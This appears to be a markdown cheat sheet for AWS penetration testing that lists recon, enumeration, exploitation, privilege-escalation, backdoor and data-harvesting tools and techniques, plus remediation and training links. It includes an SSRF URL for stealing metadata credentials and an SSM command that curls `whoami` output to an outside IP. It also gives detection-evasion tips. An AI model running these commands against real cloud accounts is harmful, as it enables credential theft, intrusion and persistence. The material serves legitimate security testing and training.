# AWS Pentest : Tools and Techniques

MITRE Att&ck : Cloud Matrix  
https://attack.mitre.org/matrices/enterprise/cloud/

## Recon / Discovery

### Basic recon
``` host -a client.com ```  
``` nslookup x.x.x.x ```  
``` nmap -Pn -p- -sV -vv -A -sS client.com```  

### DNSRecon
https://github.com/darkoperator/dnsrecon

### Cloud IP Ranges
Most cloud providers publish up to date lists of their IP address ranges. This tools identifies if an IP belongs to a provider's ranges by fetching and parsing the latest lists.  

https://github.com/nccgroup/cloud_ip_ranges

### Cloud Enumeration
Unauthenticated enumeration on the following services :
- Amazon Web Services : S3 Buckets
- Microsoft Azure : Storage Accounts
- Google Cloud Platform : GCP Buckets  

https://github.com/initstring/cloud_enum

### Cloud Brute
Find a company (target) infrastructure, files, and apps on the top cloud providers (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode).  

--> Use ipinfo.io API key  

https://github.com/0xsha/CloudBrute

### Git / Repo secret parsers
- gitleaks (https://github.com/zricethezav/gitleaks)  
- trufflehog (https://github.com/trufflesecurity/truffleHog)
- git-secrets (https://github.com/awslabs/git-secrets)

### Enumerate IAM permissions
Found a set of AWS credentials and have no idea which permissions it might have?  
--> AccessKey/SecretKey needed (authentication require)  
https://github.com/andresriancho/enumerate-iam  

Sometimes it freezes after couple of API calls. Since AWS APIs are being updated continuously. We’ll need to manually synchronize APIs with this tool.  
```git clone https://github.com/aws/aws-sdk-js.git```
```python generate_bruteforce_tests.py```

### Enumerate AWS role 
It is possible to enumerate AWS role from an AWS attacker account to other non related victim account (cross account role enumeration).

In order to proceed to enumeration, the following are required :
- Attacker AWS account with sufficient permission *iam:UpdateAssumeRolePolicy*
- Target AWS account ID
- Existing Role to be modify on attacker AWS account

```aws iam update-assume-role-policy --role-name roleEnum --policy-document file://role_policy.json```

### Retrieve Account ID from AWS Access Key

In order to proceed to enumeration, the following are required :
- Attacker AWS account  

> aws sts get-access-key-info --access-key-id=AKIAXXXXXXXXXXX  

	{"Account": "8XXXXXXXXXX"}

### S3 enumeration / brute force
#### Sandcastle bucket enumeration
https://github.com/0xSearches/sandcastle  
``` python2.7 sandcastle.py -t client.com```  

#### Bucket : GrayHat Warfare
https://buckets.grayhatwarfare.com/  
Online database containing more than 80 000 AWS buckets and Azure blobs

#### AWS Bucket Dump
https://github.com/jordanpotti/AWSBucketDump  
S3 Bucket enumeration tool

#### AWS Service enum
https://github.com/NotSoSecure/cloud-service-enum/tree/master/aws_service_enum  
- Discover AWS services which a following set of credentials has access to  
- Require AWS AccessKey

#### S3Enum
Project archived but usefull to generate S3 wordlist using suffix
https://github.com/koenrh/s3enum  
- S3 enumeration tool in GO using DNS instead of requesting AWS directly through HTTP.  
``` go get github.com/koenrh/s3enum``` 

#### S3 Inspector
Checking S3 bucket permissions  
https://github.com/clario-tech/s3-inspector  
--> AccessKey/SecretKey needed (authentication require)
--> Prerequisites : IAM user with AmazonS3ReadOnly

#### S3 Scanner
Find open S3 buckets and dump their contents  
https://github.com/sa7mon/S3Scanner  
```python3 -m S3Scanner --threads 8 scan --buckets-file ./bucket-names.txt```

#### Mass3
Enumerate through a pre-compiled list of AWS S3 buckets using DNS instead of HTTP with a list of DNS resolvers and multi-threading  
https://github.com/smiegles/mass3

#### Bucket Stream
Find interesting Amazon S3 Buckets by watching certificate transparency logs.  
https://github.com/eth0izzle/bucket-stream  

#### Slurp
Blackbox/whitebox S3 bucket enumerator  
https://github.com/0xbharath/slurp  
```./slurp domain -t company.com```  

#### List containing multiple S3 enumeration tools
https://github.com/mxm0z/awesome-sec-s3

#### bucketHead
Search across every AWS region for variety of bucket name based on domain name, the tool use *Sublist3r* to enumerate interesting subdomains  

```./buckethead.py -d flaws.cloud -t 10 --sublist3r --subbrute```  

--> https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/s3  


<br/>

## Analysis
#### Basic Vulnerability scanning
- Nessus
- OpenVas
- Nmap NSE
- Acunetix
- Qualys
- ...  

#### Cloud Mapper: Realize Cloud environment mapping
https://github.com/duo-labs/cloudmapper  

#### CloudSplaining
AWS IAM security assessment tool that identifies violations of **least privilege** and generate a risk-prioritized HTML report.  
https://github.com/salesforce/cloudsplaining  

#### Resource Counter
Command line tool counts the number of resources in different categories across Amazon regions.  

https://github.com/disruptops/resource-counter

#### Prowler
Command line tool for AWS security assessment, auditing, hardening and incident response.  
+180 checks covering security best practices across all AWS regions and most of AWS services  
https://github.com/toniblyx/prowler  

#### Scout Suite
```python3 scout.py aws --access-keys --access-key-id KDDDDDDDDDXZ --secret-access-key DEDEDEEDEDE```

#### CS-Suite (Cloud Security Suite)
CS-Suite allow for auditing security posture of the AWs infrastructure and provides system audits as well.  

https://github.com/SecurityFTW/cs-suite

#### CloudJack
CloudJack assesses AWS accounts for subdomain hijacking vulnerabilities as a result of decoupled Route53, S3 and CloudFront configurations.  

https://github.com/prevade/cloudjack

#### Principal Mapper
Tool and library for in-depth analysis with AWS Identity and Access Management  

--> Models the different IAM Users and Roles in an account as a directed graph for visualization  

https://research.nccgroup.com/2021/03/29/tool-release-principal-mapper-v1-1-0-update/  

https://github.com/nccgroup/PMapper


#### SkyArk
PowerShell project giving the opportunity to discover most privileged cloud users. Focuses on mitigating the new threat of Cloud Shadow Admins  

--> Module **AWSStealth**

```Import-Module .\SkyArk.ps1 -force```
```Start-AWStealth```

https://github.com/cyberark/SkyArk

#### AWS Inventory
Tool that tries to discover all AWS resources created in an account.   

https://github.com/nccgroup/aws-inventory  

https://www.nccgroup.com/ae/about-us/newsroom-and-events/blogs/2018/may/aws-inventory-a-tool-for-mapping-aws-resources/  

#### AwsPx
Awspx is a graph-based tool for visualizing effective access and resource relationships within AWS.  

https://github.com/FSecureLABS/awspx

<br/>	


## Exploitation / Post Exploitation
Exploitation and post exploitation are really tight in Cloud environment.

#### Web app SSRF : Accessing metadata
Extracting secrets using SSRF  
https://5x.xx.x.xx/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name  
--> Mitigation : Enable IMDSv2  
https://aws.amazon.com/fr/premiumsupport/knowledge-center/ssm-ec2-enforce-imdsv2/

#### Confused Deputy attack


#### AWS Honey tokens

AWS honeytokens are strategically placed in various locations, such as a private Git repo, on the file system of a certain server, and other similar places. Their main purpose is to detect when an attacker has breached their environment. An attacker would likely use AWS keys that they find, but aws honeytokens have no permissions and immediately alert the account owner when they are used.  

https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/awshoney_check/awshoney_check.py

#### IAM Role enumeration
IAM AWS verbose error messages disclose whether a role exists or not, allowing us to enumerate role names  


- https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/

*assume_role_enum.py* script
- https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/master/AWS/assume_role_enum

#### IAM User account enumeration
https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/

*iam_user_enum.py* script  
- https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/iam_user_enum

#### AWS pwn
Exploitation framework including multiple category:  
- Reconnaissance
- Exploitation
- Stealth
- Exploration
- Elevation
- Persistence
- Exfiltration

https://github.com/dagrz/aws_pwn  

#### PACU : Exploitation framework
MetaSploit equivalent for AWS cloud  
- Reconnaissance
- Persistence
- Privesc
- Enumeration
- Data exfiltration
- Log manipulation
- Misc exploitation  
https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/  
https://github.com/RhinoSecurityLabs/pacu  
https://github.com/RhinoSecurityLabs/pacu/wiki/

#### AWS Attack Library (WeirdALL)
Repository of useful functions (offensive & defensive) to interact with AWS services.  
https://github.com/carnal0wnage/weirdAAL  
https://github.com/carnal0wnage/weirdAAL/wiki  

#### Lambda proxy
Utility to help test AWS Lambda functions for SQL Injection vulnerabilities, using a local HTTP proxy, which transforms the SQLMap HTTP-based attacks to AWS Lambda invoke calls.  

https://github.com/puresec/lambda-proxy

#### Froud
https://github.com/reka193/froud  
- rolepolicies.py : Lists inline and managed policies attached to the role of the instance profile.
- resource.py : Lists available resources with the given credentials.
- dynamodb.py : Scans the given DynamoDB table, saving the results locally or uploading them publicly to an S3 bucket.
- sqs.py : Scans the given SQS queue, saving the results locally or uploading them publicly to an S3 bucket.
- cloudwatch.py : Scans the available Cloudwatch logs, saving the results locally or uploading them publicly to an S3 bucket.
- fuzzer.py : Sends fuzz messages to the given SQS queue.


#### Nimbostratus (python 2.7)
https://github.com/andresriancho/nimbostratus  
Nimbostratus is a set of tools for fingerprinting and exploiting Amazon cloud infrastructures  

--> Used boto library for accessing Amazon's API  
- Dump credentials from EC2 instance   
In case of SSRF modify the core/utils/mangle.py to include vulnerable URL.
- Dump instance permissions
- Dump instance meta-data
- Create DB snapshot
- Inject raw celery message (insecure pickle serialization)
- Create new user

#### DuffleBag (Public EBS snapshots)
Dufflebag is a tool that searches through public Elastic Block Storage (EBS) snapshots for secrets that may have been accidentally left in.  

- https://github.com/bishopfox/dufflebag

#### Gaining AWS console access via API Keys
https://github.com/NetSPI/aws\_consoler

#### MSF Module : AWS EC2 Instance Metadata
Attempt to connect to AWS EC2 instance metadata service and collect all metadata.  
https://www.rapid7.com/db/modules/post/multi/gather/aws_ec2_instance_metadata/


#### CCAT : 
Cloud Container Attack Tool (CCAT) is a tool for testing security of container environments in multiple Cloud environment (GCP / AWS)  

https://github.com/RhinoSecurityLabs/ccat

#### CloudCopy : Shadow copy attack
Cloud version of the Shadow Copy attack against domain controllers running in AWS. Any AWS user possessing the **EC2:CreateSnapshot** permission can steal the hashes of all domain users by creating a snapshot of the Domain Controller mounting it to an instance they control and exporting the NTDS.dit and SYSTEM registry hive file for use with Impacket's secretsdump project.  

https://github.com/Static-Flow/CloudCopy

#### From API Keys to AWS Web Console Access
*AWS_consoler* is an utility tool to convert AWS CLI credentials into AWS console access.. 

https://github.com/NetSPI/aws_consoler

#### SSM - Command execution
SSM (Simple System Manager) have agent called SSM agent. These SSM agent are by default preinstalled on the following AMI (Amazon Machine Images), moreover the ssm-user account is not removed from the system when SSM Agent is uninstalled.  

https://docs.aws.amazon.com/fr_fr/systems-manager/latest/userguide/prereqs-ssm-agent.html  

- Amazon Linux
- Amazon Linux 2
- Base optimisée pour Amazon Linux 2 ECSAMIs
- macOS10.14.x (Mojave) et 10.15.x (Catalina)
- Serveur Ubuntu 16.04, 18.04 et 20.04
- Windows Server2008-2012 R2AMIsPublié en novembre 2016 ou ultérieurement
- Windows Server2016 et 2019  

$ ```aws ssm describe-instance-information --profile leakedProfile --region eu-west-1```    
$ ```aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile leakedProfile```  
$ ```aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile leakedProfile```  
$ ```aws ssm send-command --instance-ids "i-09nXXXXX" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.XX.XX:8080/`whoami`' --output text --region=us-east-1```    

[Send Command API](https://docs.aws.amazon.com/fr_fr/systems-manager/latest/APIReference/API_SendCommand.html)


#### Exploiting public EBS volumes (same with EC2 AMI)
Elastic Block Store (Amazon EBS) has a "public" mode that makes your virtual hard disk available to anyone on the internet. (More precisely it is snapshot which can be made public)

01. Pick an exposed snapshot
02. Attach the volume to your EC2 instance
03. Search the disk for secrets 

--> DuffleBag tool can be used to automate this process.

--> By searching exposed EBS volumes, an attacker can steal secrets from a server that isn’t even exposed to the internet

https://www.youtube.com/watch?v=-LGR63yCTts

#### Golden SAML Attack
https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps

Golden SAML introduces to a federation the advantages that golden ticket offers in a Kerberos environment – from gaining any type of access to stealthily maintaining persistency.  

Here’s a list of the requirements for performing a golden SAML attack:

- Token-signing private key
- IdP public certificate
- IdP name
- Role name (role to assume)
- Domain\username
- Role session name in AWS
- Amazon account ID

**Usefull tools:**
- https://github.com/cyberark/shimit
- https://github.com/fireeye/ADFSDump
- https://github.com/fireeye/ADFSpoof

#### Shadow Copy Attack
Shadow Copy attack targets domain controllers running in AWS.   

--> Any AWS user possessing the *EC2:CreateSnapshot* permission can steal the hashes of all domain users:  
1. Create a snapshot of the Domain Controller
2. Mount snapshot to an instance under control
3. Export NTDS.dit and SYSTEM registry hive file for use with Impacket's secretsdump

https://github.com/Static-Flow/CloudCopy
https://medium.com/@_StaticFlow_/cloudcopy-stealing-hashes-from-domain-controllers-in-the-cloud-c55747f0913

#### Aws escalate
It is possible to detect what users have access to what privilege escalation methods in an AWS environment. It can be run against any single user or every user in the account if the access keys being used have IAM read access.  

https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py

#### Random privesc tips
0. Launching Rhino Security Lab tool : **aws_escalate.py**  
	--> https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py

1. Using modules *iam__enum_permissions* then *iam__privesc_scan* within PACU framework

2. Creating a new user access key :
	- *iam:CreateAccessKey* permission required  
	
--> Allows the attacker to request a new accesskey, secretkey belonging to another user in AWS environment, including full admin user.

3. Creating new login profile :
	- *iam:CreateLoginProfile* permission required  

--> Allows the attacker to create a password for a privileged entity that only has API keys, but no password based login for AWS Console.

4. Updating an existing login profile : 
	- *iam:UpdateLoginProfile* permission required  

--> Allows the attacker to change the password belonging to a login profile and use the gained privileges

5. Attaching a managed policy to an entity : If any of the following permissions:
	- *iam:AttachUserPolicy*
	- *iam:AttachGroupPolicy*
	- *iam:AttachRolePolicy*  

--> The attacker will be able to attach a new managed policy, including the AdministratorAccess policy.

6. Creating or Updating an inline policy for an entity : If any of the following permissions :
	- *iam:PutUserPolicy*
	- *iam:PutGroupPolicy*
	- *iam:PutRolePolicy*  
	
--> Allows the attacker to update an existing inline policy for a user, group or role, to add any arbitrary permission

7. Creating a new inline policy : Easiest way to privesc
	- *iam:CreatePolicy* permission required  

--> The attacker will be able to add a stealthy admin policy with misleading name such as "ReadOnlyPolicy"

8. Adding a user to a group.
	- *iam:AddUserToGroup* permission required  

--> The attacker will be able to add him or another compromised account to an existing IAM group

9. Updating the **AssumeRolePolicy** : Every role has a policy that defines who can assume this role : The combination of the following permissions is require for a user :
	- *iam:UpdateAssumeRolePolicy*
	- *sts:AssumeRole* (sts = Security Token Service)  

--> The attacker will be able to change this policy and assume a more privileged role

10. Same as previous one with the following permission :
	- *iam:SetDefaultPolicyVersion* permission  

--> Attacker will be able to change the default version of the policy to another one, which might give more privileges

11. Passing a role to a new Lambda Function and invoking it : The combination of the following permissions :
	- *iam:PassRole*
	- *lambda:CreateFunction*
	- *lambda:InvokeFunction*  

--> The attacker will be able to pass an existing role to a new Lambda function. For example : iam:AttachUserPolicy permission.

12. Updating the code of an existing Lambda function : The following permission is required :
	- *lambda:UpdateFunctionCode*  

--> The attacker will be able to modify and upload the code in an existing Lambda function and access the privileges associated with the Lambda function.

13. Creation a new policy **version** : The following permission is required:
	- *iam:CreatePolicyVersion*  

--> The attacker will be able to create new version of an IAM policy that they have access to. It needs to be set as the default version to take effect. This does not require the *iam:SetDefaultPolicyVersion*

14. Creating an EC2 instance with an existing instance profile : the combination of the following permissions is required for a user :
	- *iam:PassRole*
	- *ec2:RunInstances*
	
--> The attacker will be able to create a new EC2 instance that they will have OS access to and pass an existing EC2 instance profile/service role to it.  
--> Access to instance using 2 ways:
	- create/import SSH key and associated it with the instance on creation
	- Supply a script in the EC2 User Data<br/>

**NOTE**: Indicator of compromise will be triggered when EC2 instance profile credentials are used outside of the specific instance, not a smart move to exfiltrate these credentials and run them locally, but rather access the AWS API from within that EC2 instance

15. Passing a role to a new Lambda function, then triggering it with DynamoDB : The combination of the following permissions is require :
	- *iam:PassRole*
	- *lambda:CreateFunction*
	- *lambda:CreateEventSourceMapping*  
	
--> Attacker will be able to pass an existing IAM role to a new Lamnbda function that includes code to import the relevant AWS library to their programing language of choice. They then would need to either create a DynamoDB table or use an existing one, to create an event source mapping for the Lambda function pointing to that DynamoDB table. Then they would need to either put an item into the table or wait for another method to do so that the Lambda function will be invoked.



16. Passing a role to a Glue Development Endpoint : The combination of the following permissions is require :
	- *iam:PassRole*
	- *glue:CreateDevEndpoint*  
	
--> The attacker will be able to create a new AWS Glue development endpoint and pass an existing service role to it. They attacker would be able to SSH into the instance and use the AWS CLI to have access of the permissions the role has access to.

**NOTE**: It would be preferable for attacker to directoy use the AWS API from the new instance instead of extracting the credentials from the Glue Instance (GuardDuty will probably trigger some detection, as in method 14)

17. Updating an existing Glue Development Endpoint : The following permission is required : 
	- *glue:UpdateDevEndpoint*  

--> Attacker wil be able to update the associated SSH public key of an existing Glue Development endpoint.

18. Passing a role to CloudFormation : Combination of the following permissions is require :
	- *iam:PassRole*
	- *cloudformation:CreateStack*  
	
--> Attacker will be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating the CloudFormation stack.

19. Passing a role to Data Pipeline : Combination of the following permissions is require : 
	- *iam:PassRole*
	- *datapipeline:CreatePipeline*
	- *datapipeline:PutPipelineDefinition*  

--> The attacker would be able to create a pipeline, update the pipeline and run arbitrary AWS CLI command using the permission of the Role that was passed in.


#### AWS Services Data harvesting (post-exploitation)
S3
+ Save the content of a bucket, i.e. the objects.
	- *s3_list_bucket_contents* module : WeirdAAL (List content)
	- *s3 download file* module : WeirdALL (Download specific file)
	- *s3__download_bucket* module : PACU

SQS
+ Save the content of a queue, i.e. the messages.
	- *sqs.py* module : Froud
	--> Scans the given SQS queue, saving the results locally or uploading them publicly to an S3 bucket.
	
DynamoDB
+ Scan and retrieve all items from the table, save the results locally.
	- *dynamodb.py* module : Froud
	- *cloudwatch__download_logs* module : PACU

CloudWatch
+ Scan for all log groups and log streams, save the events from the streams locally.
	- *cloudwatch.py* module : Froud

#### Random backdoors/persistences techniques

1. Backdoor rules to an EC2 security group : **PACU** : *ec2__backdoor_ec2_sec_groups* module  
	--> Attacker attaches nw inbound rules to a security group to allow access to the EC2 instance.
	
2. Adding new user access key or password : **Multiples techniques** 
	- Using AWS CLI : *aws iam create-access-key --user-name (username) | jq -r ‘.AccessKey | .AccessKeyId+” “+.SecretAccessKey’*
	- PACU : *iam__backdoor_users_key* and *iam__backdoor_users_password* modules

3. Altering user data script : **PACU** : *ec2__startup_shell_script* module

4. Creating copies of deleted users : **AwsPwn** : *rabbit_lambda* module  
	--> In case the user accessed or created by the attacker is discovered
and deleted, it is automatically re-generated through Lambda function.

5. Adding access key to each newly created user : **AwsPwn** : *backdoor_created_users_lambda* module  
	--> Lambda function which responds to "CreateUser" events and sends fershly generated access key and secret key

6. Adding backdoor rules to newly created EC2 security groups : **AwsPwn** : *backdoor_created_security_groups_lambda* module  
	--> Add an arbitrary inbound access rule to new security groups, in response to each "CreateSecurityGroup" event.
	
7. Resource injection in CloudFormation templates.  
- https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/

8. VPC traffic mirroring within AWS.  
- https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/


<br/>



## Report / Remediation

The following resources can help during report and to provide precise recommendation regarding findings or vulnerabitilies to clients.  
- https://github.com/nccgroup/ScoutSuite/tree/master/ScoutSuite/providers
- https://avd.aquasec.com/cspm/

#### Resource : Preventing Security Misconfiguration
https://rhinosecuritylabs.com/cloud-security/aws-identity-access-management-preventing-security-configuration/  


## AWS Attack Vectors
- Data Exposure (S3 bucket)
- aws Root account
- AWS IAM users and excessive permissions/rights
- API / Storage keys /Access keys / SSH keys exposure / credentials
- Managed services
- Network
- Instances (Virtual Machines, EC2)
- Custom applications & 3rd party software
- Access Control misconfiguration
- Managed service misconfiguration
- Network security misconfiguration
- Entry points to the internal network
- Instance misconfiguration
- Software security holes
- Insecure custom applications


<br/>

# Training
## CloudGoat
- https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/
- https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/
- https://github.com/RhinoSecurityLabs/cloudgoat

## Certification Pentester Academy
- https://storage.googleapis.com/landingpages-pa.appspot.com/bootcamps/Cloud_Security_AWS_Edition_Bootcamp.pdf
- https://bootcamps.pentesteracademy.com/course/cloud-security-aws-jun-21

## SANS SEC 588 : Cloud Penetration Testing 
- https://www.sans.org/cyber-security-courses/cloud-penetration-testing/
- https://www.sans.org/brochure/course/cloud-penetration-testing/3635

## Damn Vulnerable Cloud Application
- https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6
- https://github.com/m6a-UdS/dvca

## NCC Group : SadCloud
Insecure AWS infrastructure using Terraform  
- https://github.com/nccgroup/sadcloud

## Flaws Challenge
- http://flaws.cloud/

## Flaws Challenge 2
- http://flaws2.cloud/

## Serverless goat
Serverless application demonstrates common serverless security flaws as described in the Serverless Security Top 10 Weaknesses guide https://github.com/puresec/sas-top-10  

https://github.com/OWASP/Serverless-Goat

<br/>

# AWS Pentest : Resources

#### Master Thesis : Penetration Testing of AWS-Based environments
https://essay.utwente.nl/76955/1/Szabo_MSc_EEMCS.pdf

#### OWASP AWS Security
https://owasp.org/www-pdf-archive/Aws_security_joel_leino.pdf

#### Swissky repos : Cloud AWS Pentest
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md

#### Check AWS and recommandation
https://avd.aquasec.com/cspm/#aws
https://avd.aquasec.com/cspm/#azure
https://avd.aquasec.com/cspm/#google

#### SANS WorkShop : Cloud Penetration Testing
https://www.youtube.com/watch?v=fiSJQfiS21c (Moses Frost)

#### Cloud Services Enumeration - AWS, Azure and GCP
https://notsosecure.com/cloud-services-enumeration-aws-azure-and-gcp/

#### Pivoting in Amazon Clouds
https://andresriancho.github.io/nimbostratus/pivoting-in-amazon-clouds.pdf

#### Cyberark : Cloud shadow admin
https://www.cyberark.com/resources/threat-research-blog/the-cloud-shadow-admin-threat-10-permissions-to-protect

#### IMDSv2
https://aws.amazon.com/fr/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/  

https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650  

#### DaftHack : Cloud Pentest CheatSheets
https://github.com/dafthack/CloudPentestCheatsheets

#### Hacking the Cloud : AWS
https://hackingthe.cloud/aws/

#### Amazon EC2 keys via XSS
https://www.ionize.com.au/post/stealing-amazon-ec2-keys-via-an-xss-vulnerability
http://10degres.net/aws-takeover-through-ssrf-in-javascript/

#### SSRF in Elastic BeanStalk
https://notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/

#### S3 Ransomware attack
https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/

#### Phishing users with MFA : AWS environment
https://rhinosecuritylabs.com/aws/mfa-phishing-on-aws/
https://github.com/drk1wi/Modlishka

#### Finding Secrets In Publicly Exposed EBS Volumes
https://www.youtube.com/watch?v=-LGR63yCTts

#### Exploiting IAM misconfiguration
https://sra.io/blog/aws-iam-exploitation/
